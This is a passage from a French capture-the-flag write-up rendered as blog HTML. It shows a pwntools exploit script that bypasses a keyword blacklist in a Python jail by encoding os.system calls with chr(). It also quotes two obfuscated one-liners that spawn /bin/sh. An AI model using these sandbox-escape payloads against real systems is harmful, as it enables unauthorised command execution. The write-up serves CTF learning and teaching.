+</span></span><span style="display:flex;"><span>blacklisted <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;cat&#39;</span>,<span style="color:#e6db74">&#39;grep&#39;</span>,<span style="color:#e6db74">&#39;nano&#39;</span>,<span style="color:#e6db74">&#39;import&#39;</span>,<span style="color:#e6db74">&#39;eval&#39;</span>,<span style="color:#e6db74">&#39;subprocess&#39;</span>,<span style="color:#e6db74">&#39;input&#39;</span>,<span style="color:#e6db74">&#39;sys&#39;</span>,<span style="color:#e6db74">&#39;execfile&#39;</span>,<span style="color:#e6db74">&#39;open&#39;</span>,<span style="color:#e6db74">&#39;exec&#39;</span>,<span style="color:#e6db74">&#39;for&#39;</span>,<span style="color:#e6db74">&#39;dir&#39;</span>,<span style="color:#e6db74">&#39;file&#39;</span>,<span style="color:#e6db74">&#39;input&#39;</span>,<span style="color:#e6db74">&#39;write&#39;</span>,<span style="color:#e6db74">&#39;while&#39;</span>,<span style="color:#e6db74">&#39;echo&#39;</span>,<span style="color:#e6db74">&#39;print&#39;</span>,<span style="color:#e6db74">&#39;int&#39;</span>,<span style="color:#e6db74">&#39;os&#39;</span>,<span style="color:#e6db74">&#39;read&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;143.198.184.186&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">45458</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span>print(proc<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;latin-1&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">valid</span>(cmd):
+</span></span><span style="display:flex;"><span>	safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> str(cmd):
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (ord(char)<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">33</span> <span style="color:#f92672">and</span> ord(char)<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">126</span>):
+</span></span><span style="display:flex;"><span>			safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>			print(<span style="color:#e6db74">&#39;Badchar !! &#39;</span><span style="color:#f92672">+</span>char)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> badword <span style="color:#f92672">in</span> blacklisted:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> badword <span style="color:#f92672">in</span> str(cmd):
+</span></span><span style="display:flex;"><span>			safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>			print(<span style="color:#e6db74">&#34;You used a bad word!&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> safe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rce</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Get User Input</span>
+</span></span><span style="display:flex;"><span>	data <span style="color:#f92672">=</span> input()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Payload</span>
+</span></span><span style="display:flex;"><span>	final <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;__builtins__.__dict__[&#39;__IMPORT__&#39;.lower()](&#39;OS&#39;.lower()).__dict__[&#39;SYSTEM&#39;.lower()](&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>		final <span style="color:#f92672">+=</span> bytes(<span style="color:#e6db74">&#39;chr(&#39;</span><span style="color:#f92672">+</span>str(ord(data[i]))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;)+&#39;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>	final <span style="color:#f92672">+=</span> bytes(<span style="color:#e6db74">&#39;chr(&#39;</span><span style="color:#f92672">+</span>str(ord(data[len(data)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;)&#39;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>	final <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;)&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> valid(final):
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Send Payload</span>
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>sendline(final)
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Print Response</span>
+</span></span><span style="display:flex;"><span>		print(proc<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;latin-1&#39;</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">&#34;You used a bad word!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">True</span>):
+</span></span><span style="display:flex;"><span>	rce()
+</span></span></code></pre></div><p>Disponible <a href="./files/exploit.py">ici</a></p>
+<p>Et voici le résultat :</p>
+<p><img src="./img/flag.png" alt="Alt text"></p>
+<p>D&rsquo;autres joueurs on fait d&rsquo;autres méthodes intéressantes comme celle-ci pour avoir directement un shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>getattr(getattr(__builtins__,<span style="color:#e6db74">&#34;__imp&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;ort__&#34;</span>)(<span style="color:#e6db74">&#34;o&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s&#34;</span>),<span style="color:#e6db74">&#34;sy&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;stem&#34;</span>)(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+</span></span></code></pre></div><p>ou</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>__builtins__<span style="color:#f92672">.</span>__dict__[<span style="color:#e6db74">&#39;__IMPORT__&#39;</span><span style="color:#f92672">.</span>lower()](<span style="color:#e6db74">&#39;OS&#39;</span><span style="color:#f92672">.</span>lower())<span style="color:#f92672">.</span>__dict__[<span style="color:#e6db74">&#39;SYSTEM&#39;</span><span style="color:#f92672">.</span>lower()](<span style="color:#e6db74">&#39;sh&#39;</span>)
+</span></span></code></pre></div>
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/unknown2-grabcon-ctf-2021/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Writeup Unknown 2 | GrabCon 2021 | Catégorie...</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/writeups/tweetybirb-killerqueenctf-2021/?ref=footer"><span style="font-weight:bold;">Next »</span><br>TweetyBirb | KillerQueen 2021 | Catégorie Pwn</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fichiers">Fichier(s)</a></li>
+    <li><a href="#necessaires">Necessaires</a></li>
+    <li><a href="#flag">Flag</a></li>
+    <li><a href="#solution-détaillée">Solution détaillée</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
